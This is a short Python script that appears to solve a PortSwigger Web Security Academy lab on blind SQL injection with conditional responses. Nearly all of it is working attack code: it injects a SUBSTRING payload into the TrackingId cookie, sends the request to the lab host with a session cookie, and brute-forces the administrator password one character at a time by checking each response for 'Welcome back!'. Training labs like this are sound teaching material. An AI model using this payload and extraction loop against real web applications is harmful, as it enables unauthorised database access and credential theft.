#!/usr/bin/python3

# blind-sqli-exploit.py - Exploits portswigger's "Blind SQL injection with conditional responses" lab.
# I remember that my original idea was to use binary search for this exploit, but I was struggling so much with coding it that I just decided to solve the lab as quickly as possible.
# It would be fun to come back some day and refactor it, tho.

import requests

host = '0adf002d04d0d835822415fe00cc0008.web-security-academy.net'

possible_chars = "0123456789abcdefghijklmnopqrstuvwxyz" # lab's hint said that the chars were all alphanumeric
formed_password = "1r"
last_found_char = "r"

while last_found_char != "":
    for char in possible_chars:
        attempt = formed_password + char
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, {len(attempt)}) = '{attempt}' --"
        headers = {
            'Host': host,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
            'Cookie': f"TrackingId=0mGvDkaYVinRQpOp{payload}; session=Lyyxp83k7vKRrGE9vRGWlir0GgXqn2qO",
        }

        print('Attempting: ', attempt)

        res = requests.get(
            f'https://{host}/',
            headers=headers,
            verify=False,
        )

        if res.content.find(b"Welcome back!") != -1:
            formed_password += char
            last_found_char = char
            print("Formed: ", formed_password)
            break
        else:
            last_found_char = ""








# print(response.content)

# if response.content.find(b"Welcome back!"):
#     print("cafunfou!!!!")
